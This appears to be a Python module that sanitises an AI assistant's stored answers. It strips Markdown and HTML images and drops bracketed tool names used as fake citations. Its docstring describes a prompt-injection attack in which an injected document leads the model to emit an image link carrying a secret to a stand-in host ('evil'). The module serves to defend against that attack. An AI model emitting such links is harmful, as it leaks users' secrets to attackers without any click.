"""Answer hygiene applied before an answer is stored (audit S3).

A prompt-injected document can ask the model to write `![](https://evil/?d=<secret>)`;
any client that renders the image sends the data with zero clicks. Stored answers keep
the alt text and drop the image, so every consumer (web, API, MCP, Slack) is safe.

The model sometimes cites a tool instead of a source ("… vendors [list_entities]."):
a bracketed tool name isn't a citation, so it's dropped too."""

import re

_MD_IMAGE = re.compile(r"!\[([^\]\n]*)\]\s*(?:\([^)\n]*\)|\[[^\]\n]*\])")
_HTML_IMAGE = re.compile(r"<img\b[^>]*>", re.IGNORECASE)
_CODE = re.compile(r"(```[\s\S]*?```|`[^`\n]*`)")


def _strip(part: str) -> str:
    part = _MD_IMAGE.sub(
        lambda m: f"[image: {m.group(1).strip()}]" if m.group(1).strip() else "", part
    )
    return _HTML_IMAGE.sub("", part)


def strip_images(text: str) -> str:
    """Remove Markdown and HTML images outside code spans and blocks."""
    parts = _CODE.split(text)
    return "".join(p if i % 2 else _strip(p) for i, p in enumerate(parts))


TOOL_NAMES = frozenset(
    [
        "search_knowledge", "read_document", "list_collections", "search_web",
        "list_entities", "explore_entity", "query_records", "resolve_role", "scan",
    ]
)  # fmt: skip
_TOOL_MARKER = re.compile(r"[ \t]?\[([A-Za-z_ ]{3,40})\]")


def strip_tool_markers(text: str) -> str:
    """Remove "[list_entities]"-style markers (a tool's name in brackets) outside code."""

    def drop(m: re.Match) -> str:
        name = m.group(1).strip().lower().replace(" ", "_")
        return "" if name in TOOL_NAMES else m.group(0)

    parts = _CODE.split(text)
    return "".join(p if i % 2 else _TOOL_MARKER.sub(drop, p) for i, p in enumerate(parts))
